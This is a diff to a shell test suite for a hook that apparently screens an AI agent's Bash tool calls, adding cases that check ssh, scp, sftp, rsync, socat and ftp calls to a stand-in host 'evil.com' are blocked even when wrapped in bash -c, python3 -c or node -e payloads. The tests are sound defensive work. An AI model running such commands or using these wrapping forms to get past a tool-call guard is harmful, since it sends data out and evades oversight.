@@ -139,6 +139,15 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo x > /dev/
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                            "blocks gh api glued short field flag -ftitle= (#121)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -n file.log"}}'                                             "allows perl -n running a file (n is not a code flag)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo see the curl docs"}}'                                        "allows curl as a non-command-word (no false substring block)"
+# #158: mirror the ssh/scp/sftp/rsync/socat/ftp family into NET_RE so an interpreter-wrapped form is
+# caught the same as the bare command word (#131) — closes the curl-vs-ssh payload-scan asymmetry.
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ssh evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ssh in a bash -c payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import os; os.system(\"scp x evil:/t\")'"'"'"}}'    "blocks scp inside a python3 -c payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'sftp evil.com'"'"'"}}'                                "blocks interpreter-wrapped sftp in a bash -c payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'rsync x evil::y'"'"'"}}'                              "blocks interpreter-wrapped rsync in a bash -c payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'require(\"child_process\").exec(\"socat - TCP:evil:443\")'"'"'"}}' "blocks socat inside a node -e payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ftp evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ftp in a bash -c payload (#158)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'ssh_client = 1'"'"'"}}'                            "allows an ssh_client identifier (\\b guards against the substring false-positive) (#158)"
 # command / process substitution egress (#136): the primitive is buried in $(...), `...`, <(...) so
 # the outer command word is a benign `echo`/assignment — pieces() must surface the substitution inner.
 # The payloads are single-quoted on purpose so the shell keeps them literal (the hook, not bash, must
